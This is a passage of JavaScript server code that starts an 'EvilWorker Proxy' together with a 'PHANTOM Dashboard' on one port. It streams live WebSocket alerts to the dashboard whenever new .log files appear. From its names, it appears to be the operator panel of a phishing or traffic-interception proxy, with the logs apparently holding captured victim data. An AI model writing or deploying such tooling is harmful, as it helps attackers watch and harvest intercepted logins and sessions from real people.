// 𝚂𝚃𝙰𝚁𝚃 𝙱𝙾𝚃𝙷 𝙾𝙽 𝚃𝙷𝙴 𝚂𝙰𝙼𝙴 𝙿𝙾𝚁𝚃
// ================================================

const app = express();

// Mount dashboard on /dash
app.use('/dash', dashApp);

// Mount the proxy on the root path
app.use((req, res) => {
    proxyServer.emit('request', req, res);
});

const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, () => {
    console.log(`✅ EvilWorker Proxy + PHANTOM Dashboard running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${dashUser}/${dashPass})`);
});

// ---- 𝚆𝙴𝙱𝚂𝙾𝙲𝙺𝙴𝚃 𝙵𝙾𝚁 𝙻𝙸𝚅𝙴 𝚄𝙿𝙳𝙰𝚃𝙴𝚂 ----
const wss = new WebSocket.Server({ server });
let clients = [];
wss.on('connection', (ws) => {
    clients.push(ws);
    ws.on('close', () => {
        clients = clients.filter(c => c !== ws);
    });
});

try {
    fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
        if (filename && filename.endsWith('.log')) {
            clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify({ type: 'newLog', file: filename }));
                }
            });
        }
    });
} catch (err) {
    console.warn('⚠️ File watching not available. Frontend will poll.');
}
